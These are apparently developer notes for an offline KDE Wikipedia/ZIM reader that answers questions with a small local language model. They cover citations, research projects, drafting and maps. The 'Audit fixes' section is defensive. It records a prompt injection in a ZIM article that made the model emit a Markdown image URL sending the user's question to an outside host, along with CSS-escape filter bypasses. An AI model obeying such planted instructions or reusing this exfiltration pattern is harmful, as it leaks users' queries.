- **Follow-ups: two departures from Athenaeum, both measured.** (1) Athenaeum searched every question under 6 words together with the previous one, so "What is a noble gas?" after a Ray Charles question got Ray Charles sources. Now only a question that points back ("its", "he", "that", "ones"), starts like a continuation ("and…", "what about…") or names nothing borrows the previous question. (2) Athenaeum replayed earlier answers as chat turns; `qwen3.5:2b` then copied its previous answer word for word instead of answering ("and when was it discovered?" got the boiling point again): 2 of 4 follow-ups failed. The prompt now names the last 3 earlier questions in one line and replays no answers: 4 of 4 right, and a shorter prompt.
- **Refusals** ("I could not find…", and now "do not state/give/list/specify") get no chips; an answer that opens with one gets none at all.
- **Citations in the page:** each cited sentence gets Markdown links `[\[n\]](cite:n)` (and `[\[?\]](check:i)` when flagged) inserted after it by `Rag::annotate`; the `TextEdit` shows them as links, with the source or the reason as a tooltip. A click opens the article **at the cited section**: `ArticlePage.fragment`, jumped to a moment after loading. Loading `page#section` directly, or jumping as soon as loading finished, left the page at the top while it was still sliding in.
- **Saving:** the question is saved when asked, the answer when it ends (done, stopped or error) with its sources, citations and timings. Leaving the page or quitting during an answer stops it and saves what was written as stopped (checked: 89 characters and 5 sources saved). The Ask page reopens a chat from the Chats list exactly as it was.
- **Also fixed on the way:** `ZimReader` counted the ZIM's own front page (`mainPage` -> `index`, a list of titles) as an article, so Random could open it and A to Z listed it. It is left out now (test in `zimreadertest`).
- **Known limits.** Citations match by meaning, so a sentence that overstates its source ("a dozen children with both of his wives") is cited, not flagged: a hint for checking, not a fact-checker, as in Athenaeum. The 2B model sometimes mixes sources: "What instrument did Ray Charles play?" listed a song's band members' instruments, cited to that song, while the Ray Charles infobox ("Instruments: Vocals, piano") did not make the prompt. Each answer takes 2 s longer than it needs while Ollama keeps one model loaded.

## Ask about this article (`ArticlePage.qml` panel, `ArticleScope` in `core/answerer.h`, schema v5)

- **What it is (as in Athenaeum's article chat):** "Ask" on an article opens a chat beside it (over it when the page is narrower than 40 grid units). Answers come from that article alone: the article is read with `ZimReader::content` (on the UI thread; extracting runs in the worker), its passages picked and ranked as in Ask, and the sources are **its sections** (`Rag::buildContext(ranked, true)`: one source per section, the introduction labelled "Introduction"), with Athenaeum's article system prompt (`Rag::articleSystemPrompt`). A citation scrolls the same page to the section; a source in another article (none today) would open its own page.
- **Saved like any chat**, with its article. The panel lists earlier chats about the article (`ChatList` with `articleLibraryId`/`articlePath`) and starts a new one; following a link to another article starts a chat about that one. The Chats page marks them ("About “Ray Charles”") and reopens them on their article with the panel open (`ArticlePage.openChatId`).
- **Selected text:** right-click offers Copy and "Ask About This", which opens the panel with "What does the article mean by “…”?" in the question box to edit or send. (Not exercised by the offscreen check, which cannot right-click.)
- **Measured, not adopted: ranking all of a long article's passages.** Six passages per article, picked by words, seemed too few for a chat about one long article (Ray Charles: 40 passages), so all of them (up to 40) were embedded instead. On 11 questions, 6 of them worded unlike the article ("Why did his wife leave him?", "Did he ever go to prison?"), the answers were as good either way except one ("Was he good at business?" found the ABC contract only with all 40), and embedding took 1.35 s instead of 0.25 s: 1.1 s more before every answer. Kept at six, as Athenaeum does for libraries read from the ZIM. Neither found the "Chess hobby" section for "What did he do for fun?".

- **Jumping to a section while the web view is hidden** (narrow window, panel over the article) scrolled to the end of the page. The panel closes first and the jump waits until the article is laid out, as for a page that has just loaded.

## Research projects (`core/projects.*`, project mode of `core/answerer.*`, `projectlist.*`, `projectmodel.*`, `documentmodel.*`, `qml/Project*.qml`, `DocumentPage.qml`)

- **As in Athenaeum** (its CLAUDE.md, "Research projects"): a project is a title and a goal, sources, chats and Markdown documents. Tables (schema v6) `projects`, `project_items` (kind `article` | `clip` | `chat`; a clip is a saved excerpt: text, section, `refs` JSON of the articles it came from, its embedding as a float32 BLOB with the model's name), `project_documents`, and `chats.project_id` (a chat started in a project; `ON DELETE SET NULL`, so deleting the project keeps it). Adding an article twice keeps one item and never replaces a note with an empty one. Removing a library takes its articles out of projects and keeps excerpts (they hold their own text). Ported tests in `autotests/projectstest.cpp`.
- **Adding:** "Add to Project" on an article; select text, right-click, "Save to Project…" (an excerpt); "Save to Project…" under an answer (the answer as an excerpt naming the articles it was drawn from); "Add to Project…" on a chat in Chats (attached); "Add Article…" on the project page (title search across libraries). `ProjectPicker` chooses a project (most recently used first) or starts one, with an optional note.
- **Project chat** (the Chat tab; `ProjectScope` in `core/answerer.h`): answers from the project's articles and its saved excerpts, with the title and goal in the system prompt (`Rag::projectSystemPrompt`). The articles are read from their ZIMs for each question (in the worker); a project with more than 6 articles reads passages from the 6 whose text shares the most words with the question (`Rag::chooseArticles`; Athenaeum ranked all of an indexed project's passages in the database instead). Excerpts: the best 3 at or above 0.45 similarity (`Rag::rankClips`), shown first as "Saved excerpt" sources and cited like any other. "Also search the whole library" adds up to 3 articles from outside the project as a separately labelled group ("Other library articles (NOT part of the research project)", marked "outside the project" under the answer).
- **Excerpts are embedded when a question needs them**, in the same `/api/embed` call as the question and the passages, and the vector is saved (`Answerer::clipsEmbedded`). So an excerpt saved while Ollama was off, or before the embedding model was changed (a vector from another model is never compared), gets its vector the first time it matters. Athenaeum embedded at save time and needed a separate re-embedding job after a model change. Checked: after one question, the excerpt's row held a 768-dimension vector tagged `nomic-embed-text`.
- **Documents open in a window of their own** (`src/documentwindow.*`, `DocumentWindows` QML singleton; one window per document, opening it again brings it forward): **Kate's editor** (KTextEditor: Markdown highlighting, spell check, search and replace, vi mode, its own settings through "Configure Editor…") beside a live Markdown preview (a `QTextBrowser` that loads no images at all; zim:// links show the article in the main window and bring it forward). The toolbar has the title, Cite (a native menu), Preview, Export… and the saved state. Saved 900 ms after typing stops and when the window closes (a failed save says so, as Athenaeum learned), through the same `DocumentModel` as before. Document windows do not keep the app running: closing the main window quits and closes them, saving. A window closes when its document or project is deleted. Tested in `autotests/documentwindowtest.cpp` (built from the app's sources, offscreen).
- **Why a window, not the page (tried 2026-10-19):** Kate's editor is a widget. Qt 6.8 can put it in a QML page (`WindowContainer` with the view's native window), and it worked, but the native window covers everything QML draws over it: the Cite menu and a passive notification were cut off exactly at the editor's edge (checked in a headless KWin, `kwin_wayland --virtual`, with Spectacle screenshots: no Xvfb on this machine), and so would tooltips, dialogs and the drawer in a narrow window. **Do not embed widgets in QML pages here.**
- **Citing and exporting:** "Cite" inserts a link to one of the project's articles (`[Water](zim://lib1/Water)`, parentheses percent-encoded so "Ray_(film)" does not end the link) or a saved excerpt as a quotation with a "— source" line. Links in the preview open the article in the app. **Export** (one document, or the whole project as one file: goal, documents oldest first, sources with notes, excerpts with notes) turns article links into plain text plus a References list naming each article and its library, since zim:// links mean nothing outside the app.
- **Measured** (chemistry mini + Ray Charles maxi, 4 articles and 1 excerpt in the project): "Why does water dissolve salt so well?" answered from the saved excerpt and the project's articles, every sentence cited, first words after 3.9 s, 16 s in all. With "Also search the whole library", "Who was Ray Charles?" was answered from the Ray Charles library, its sources listed as outside the project (the model did not say so in the answer, as the prompt asks).
- **Checked in the UI** (offscreen): Projects list, a project's three tabs, the project chat with and without the library, a document with an inserted link and quotation in split view, the picker creating a new project with a passage and a note, and a project chat listed in Chats ("In “Water as a solvent”") reopening in its project.
- **AI drafts** (`core/drafts.*`, port of Athenaeum's `research.py`; "Draft with AI" on the Documents tab): *Summary of the project* reads up to 15 articles straight from their ZIMs (the first 3,500 characters of prose), has the model summarise each in 3 to 4 sentences, then write a 4 to 6 sentence overview of what the material says about the goal ("Do NOT restate the question": Athenaeum's first overview just paraphrased it). The overview's sentences are numbered to the sources by the app (embedding match against the summaries and the excerpts from summarised articles, at least 0.70; a "does not cover" sentence gets none), never by the model. The document has the overview, each source with its summary and the user's note, the excerpts, and References. *Notes from a chat* streams "Questions explored / Key findings / Open questions" from the chat's questions and answers (the last 5,500 characters) and lists the articles it drew on (not excerpts). The result becomes a new document of the project and opens; Stop keeps nothing. Measured: a summary of 4 articles in 53 s (about 10 s per article: 15 would be about 2.5 minutes, with progress and Stop), chat notes in 11 s. qwen3.5:2b wrote the notes' sections as "#" though asked for "##"; top-level headings are made sections (`Drafts::demoteHeadings`), since the document's title is the only top level.
- **Write From Your Instructions** (KAthenaeum's addition, 2026-10-19; "Draft with AI" menu): the user gives a title and instructions ("A full report on how Crater Lake formed: Mount Mazama, then the caldera…, formal tone, a short conclusion"), short (3 sections of ~180 words) or full (up to 6 of ~300), and optionally the whole library (forced on when the project has no sources). A small model cannot write a long report in one prompt (6,144 tokens of context), so `Drafter::writeReport` **plans, then writes section by section**: one call writes an outline ("Heading: what it covers" per line; `Drafts::parsePlan` reads the numbered, bulleted, bold and "##" forms it actually writes), then each section gets its own sources (the project's articles read once, plus the library, searched with `Drafts::sectionQuery`: heading, brief, title **and the instructions' first sentence**: without it "The Newest Crossing" found bridges in Portland, Maine) ranked by embedding as in Ask, and a prompt carrying the instructions, the section's brief and the other headings. Each sentence is then cited by the app (`Rag::attribute`), numbered report-wide and renumbered by first use (`Drafts::renumberCitations`), with "[?]" on a sentence no source backs or a figure none contains (not on short labels); References lists only what is cited. Measured with the full English Wikipedia: a full report on Crater Lake (5 project articles) in 3.5 min, 2,372 words, 6 sections; a short one in 1 to 1.5 min. **Fixes from reading real output:** the model repeated the section heading as its first line (dropped, and the app had cited it), a citation after a table row broke the table (none on table rows or headings), sections ended "In conclusion…" (the prompt now forbids it outside a conclusion), a section ran out of tokens mid-sentence (budget words × 3 + 200, and an unfinished last sentence is dropped). Wrong figures still happen with a 2B model ("5,700 to 6,000 years ago" for 7,700); the instructions say to copy figures exactly, and "[?]" points at many of the rest.
- **Saved excerpts are marked in their article** (Athenaeum's `highlights.ts`, done while rendering here because the article view runs no JavaScript): `ArticleRenderer::render` takes highlights and wraps each one's first occurrence in `<mark class="excerpt-hl" title="Saved in “Project”: note">`, one per text node it spans, so a passage may cross links and paragraphs. Matching ignores whitespace and case; a passage no longer in the text is not shown; the same passage saved in several projects is one mark naming them all (`Projects::highlightsFor`). The rendered-article cache is cleared whenever a project changes, and the page reloads after "Save to Project…" (once the picker has closed, Athenaeum's lesson about losing the selection). **libxml2 merges a text node added next to another text node** (`xmlAddPrevSibling`/`xmlAddNextSibling`) into that node: adding the "before" text next to the original node and then freeing the original lost the text after every mark (tests caught it). The original node now keeps the "before" text and only the mark, an element, is added next to it. Checked under ASan on the real Water and Ray Charles pages.
- **Notes in a document's preview** (Athenaeum's `cites.ts`; `Projects::previewMarkdown`): the stored Markdown is untouched; the preview shows a cited project article's note after its link, and a saved excerpt's note under a quotation of it (the "— source" line set aside; a quote of at least 30 characters that is part of the excerpt, or contains it, counts). A note the document already shows is not repeated. The preview binding reads `project.articles` so it is redone once the project's sources have loaded (a method call alone is not watched by QML).
- **Gotcha:** a dialog (`Kirigami.Dialog`) is in the window's overlay, which `grabToImage` cannot capture (no QML engine). Grab the dialog's `contentItem` instead.

## Maps (`core/pmtiles.*`, `core/maptiling.*`, `core/mapextract.*`, `core/mvt.*`, `core/maplookup.*`, `core/mapplaces.*`, `core/mapregions.*`, `mapmanager.*`, `qml/MapPage.qml`, `qml/MapRegionsPage.qml`, the Maps section of `qml/SettingsPage.qml`)

- **What it is:** a Map page (sidebar) showing the regions downloaded in Settings. A click on a place shows what it is and "Read “Portland, Oregon”" from the installed libraries, a "Search the Libraries" fallback, and what the place is in (its park, town, county, state), each opening its article. A search box finds places by name.
- **Where the map comes from:** Protomaps' daily planet build (`https://build.protomaps.com/YYYYMMDD.pmtiles`, ~139 GB, OpenStreetMap data, the newest from `build-metadata.protomaps.dev/builds.json`), read by HTTP ranges: `MapExtract` reads the header and root directory (first 16 KiB), lists the region's tiles from its shape (`MapTiling::tileIds`: each zoom's tiles that the outline crosses plus those inside, holes left out), reads only the leaf directories that cover them, then fetches the tiles' contents in merged ranges (gaps under 256 KiB merged, 16 MiB per request, 4 at a time, each retried 3 times and checked against `Content-Range`) and writes a new archive (same clustered order, identical tiles stored once, directories rebuilt, written with `QSaveFile` so an update keeps the old map until the new one is complete). openstreetmap.org's own tile servers forbid bulk downloads: never use them.
- **Measured** (2026-10-19, this laptop): the world overview (zoom 0 to 6) is 5,461 tiles, 45 MB, 2.3 s; Oregon at zoom 13 is 92 MB in 6 s (cut to the state's shape: its bounding box was 108 MB), at zoom 15 about 400 MB (500 MB for the box); Portland's centre at zoom 15, 1,733 tiles, 42 MB in 5 s. Zoom 7 for the world would be 189 MB. Detail levels offered: streets (zoom 15, the most the build has) and roads and towns (zoom 13, about a fifth); a region over 4 million tiles at the chosen detail is refused with advice (`MapCatalog::MaxTiles`: the tile list is held in memory while cutting).
- **The region list** is Geofabrik's `index-v1.json` (3.7 MB, cached a month): 554 regions with their shapes and OpenStreetMap extracts. Its quirks (2026-10-19): the US states are named by their id (`us/oregon`) and listed under North America (renamed "Oregon" and moved under the United States), Polish and Norwegian names contain `<br />`, and Georgia the country (`georgia`, Europe) differs from the state (`us/georgia`).
- **Choosing a region** (`qml/MapRegionsPage.qml`, redesigned 2026-10-19): a grid of cards, each with the region's own outline (`MapManager::regionShape`: Geofabrik's shape in Web Mercator, simplified to a few hundred points, drawn by `RegionSilhouette.qml` with Qt Quick Shapes), a breadcrumb (World › North America › United States), a search, and a world-overview card until the world is downloaded. A region opens a panel with its outline and both detail levels as cards, **measured at once** (two estimates in parallel). Outlines across the 180° meridian (Alaska, Russia, Asia, Oceania) are cut at the widest gap in their longitudes, not at 180°; Antarctica (a band round the globe) is left whole. The curve renderer left one of two shapes sharing an edge unfilled (Oceania): the default renderer with a multisampled layer is used.
- **Drawing:** MapLibre's Qt Quick item (`import MapLibre 4.0`, OpenGL: `main()` sets the graphics API). The style is made at run time (`MapManager::styleUrl`): Protomaps' layers (light or dark, following the colour scheme), once per region, the world first so each region's detailed land, water and labels cover the world's coarse ones; glyphs and sprites are local files. A new style file name each time regions change (MapLibre reloads when the address changes). **MapLibre could not read the planet build over HTTP** (a black map, no error): it is only ever given local files.
- **What a click finds:** `MapLookup::nearest` decodes the tile under the click (and its neighbours near an edge) from the region's own file (`Mvt`, a small protobuf reader) and takes the nearest labelled point in `places` or `pois` that the map shows at that zoom (`min_zoom`), within 1.5 grid units. **Protomaps' feature ids are OpenStreetMap ids with the type above bit 44** (1 node, 2 way, 3 relation: Pioneer Courthouse is `w31732583`), and places carry `wikidata`; points of interest do not carry a Wikipedia tag, hence the places index.
- **The places index:** after its map, a region's OpenStreetMap extract is downloaded from Geofabrik (Oregon: 255 MB, 74 s), read with libosmium in three passes (relations, ways, nodes; node positions merged by id) and deleted. Kept (`map_places`): every named feature with a `wikipedia` or `wikidata` tag and every named settlement, with its point (a relation's `label` or `admin_centre` node when it has one), its extent and whether it is an area (closed and not a road, railway, barrier or waterway). Oregon: 12,060 places (5,019 with a Wikipedia tag) in 5.5 s. The clicked feature's OpenStreetMap id finds its `wikipedia` tag ("en:Portland, Oregon"), so the article is exact; without one, Wikipedia's usual titles are tried ("Salem, Oregon", then the name), marked as a name match. "What is it in" comes from the R*Tree of areas around the point, smallest first, each checked against its outline: **a bounding box alone was wrong** (a click on Crater Lake listed Douglas County, whose box overlaps Klamath County's). An area keeps its ways as simplified polylines (Douglas-Peucker, ~30 m, at most 4,000 points; outer and inner ways alike, in any order), enough for an even-odd crossing test without assembling rings (`MapPlaces::outlineContains`).
- **Checked** in the real app (headless KWin, Spectacle) with the user's full English Wikipedia (127 GB): Portland (city) opened "Portland, Oregon", Pioneer Courthouse opened its article, Crater Lake opened "Crater Lake" with "Crater Lake National Park" and both counties listed.
- **MapLibre Qt gotcha:** after an animated `easeTo()` the item's `coordinate` and `zoomLevel` keep the values from before the animation (they are read back from the camera when the call is made), so every click was placed ~100 px off. The page sets `coordinate` and `zoomLevel` directly.
- **Not yet:** resuming an interrupted region (it starts again), a "show on map" from an article, markers for a project's places.

## Audit fixes (the review of 2026-10-19: what was found, so it is not reintroduced)

Four reviewers worked independently on scratch copies (security and untrusted input; core correctness and threads; the data layer; the QML UI), each finding reproduced before it was fixed. Tests were added for each that can be tested.

- **Offline was not guaranteed (security, high).** A ZIM article told the model to end its answer with `![](http://host/?q=<the question>)`; qwen3.5:2b did, 4 times out of 4, and the answer view fetched it. ZIM titles and descriptions shown in ordinary labels were read as rich text and fetched `<img>` too. Now: the QML engine's network manager refuses everything but https on kiwix.org (`KiwixOnlyAccess` in main.cpp; catalog thumbnails are checked the same way); every Label, Heading and Text has `textFormat: Text.PlainText`; tooltips, menu items, chips, combo boxes and page titles get outside text through `Util.plain` (Qt treats a first line holding anything tag-like, or "&lt;", as rich text); answers lose their images in `Rag::tidyAnswer`. Checked with the reviewer's hostile ZIMs and a local request logger: the model still obeyed, nothing reached the logger. **Never show ZIM, catalog, model or user text in a QML item that can read it as rich text.**
- **A 29 KB ZIM held a 300 MB article** that took 3 GB to render; libxml2's XPath then gave up and the sanitiser's drop list matched nothing (it failed open: scripts and styles survived, only JavaScript-off and the CSP held). Entries over 16 MB (HTML) or 32 MB are not read (`ZimReader::tooLarge`), and a query libxml2 cannot finish makes the render fail. CSS escapes (`u\72l(`) got past the style filter: a style with a backslash, `image-set(` or `src(` is dropped. Web links open in the browser only on a real click (`LinkClickedNavigation`).
- **Removing a library while a search ran crashed** (null archive in the worker: the search looked archives up again after `ZimReader::close`). A search now takes one reference to each archive when it starts. Workers reached the database through `ZimArchives::get` (Qt refused, so it only skipped articles); off the main thread `get` now returns only already-open archives. Tests: a stress test that crashed without the fix, and a test that fails on Qt's cross-thread warning.
- **Library ids were reused**: SQLite gives the next row max + 1, so a library added after the newest was removed inherited its id, and chats, excerpts and document links pointed at the new ZIM; the same ZIM added again got a new id and lost them. `removed_libraries` (schema v7) fixes both.
- **A refused database stayed open** (a newer build's database was written by the older build; a failed migration left the app saving into the old schema). `Database::open` closes on every failure, checks BEGIN/COMMIT, and the app stops with a message instead of starting.
- **Quitting during download verification** kept the process alive, windowless, for minutes (libzim's `check()` cannot be interrupted and `~QCoreApplication` waits for the thread pool). Verification is now our own chunked MD5 (what `check()` does: the whole file but its last 16 bytes) with a stop flag set on `aboutToQuit`, and a download left "verifying" is verified again at the next start.
- **Smaller core and data fixes:** the answer was tidied twice and `tidyAnswer` was not stable, so citations could index another string (one tidy now, and tidying repeats until stable); a pasted page as a question pushed the sources out of the context (2,000 characters at most; earlier questions shortened to 300); an older settings refresh could overwrite a newer one; a saved answer named the models in Settings at the end, not the ones it used; a failed autosave lost the text on leaving (a dirty flag cleared only by a successful save); a project's own chat could be attached to it too and was counted twice; each autosave refreshed every list and cleared the article cache; a chained `QString::arg` filled a "%1" inside an article title.
- **UI:** the library home's find box jumped to Search after 100 ms (`Kirigami.SearchField` accepts by itself unless `autoAccept: false`); catalog filters showed their defaults while the old ones still applied; **leaving the page stopped an answer or threw away a draft** (an answer whose page closes now finishes and is saved in the background, and drafting is one app-wide job that opens its document wherever the reader is; quitting still saves an answer as stopped); a removed library's home and articles stayed as they were (pages now re-read on library changes and say it is gone); a new project with an empty name closed the picker silently; opening a chat from a project replaced the project page; infobox headers were white on yellow in dark mode; the search scope menu went stale and showed two "Ray Charles"; Report a Bug went to bugs.kde.org; first rows looked selected; strings were built by concatenation; Ollama-down showed one error three times; Ask without libraries saved an empty chat. Polish: a real icon, Breeze icons that read (folder-bookmark for projects, bookmark-new for adding to one), consistent wording and delete icons, About page credits.
- **Found later (2026-10-19, while adding maps):** `KiwixOnlyAccess` refused `data:` URLs too, so every installed library lost its icon; `data:` is allowed again (it never leaves the computer).
- **QML lessons:** a method call in a binding is never re-run (use a property and re-read it on a signal, or depend on a notifying property); a nested layout fills by default; `Kirigami.Dialog.standardButton()` is null until the dialog is shown.

## Conventions

- When creating the git repo, add a `.gitignore` for build directories (`build/`, `build-*/`), `*.deb` and CPack output, editor files, and any local ZIM files or test databases.
- Labels showing anything not written by the app are plain text, and the interface never fetches from the network except the catalog (see "Audit fixes"). Keep it that way when adding UI. Map downloads are made by the core (`MapDownloader`), only from the hosts `MapCatalog::isAllowedUrl` names.
- Prefer the simplest thing that fits. Don't add services (a database server, a vector DB, kiwix-serve, a task queue) without asking.
- Nothing may assume a discrete GPU or a big model.
- Keep this file current when decisions change; move items from "Open decisions" to "Decisions made".
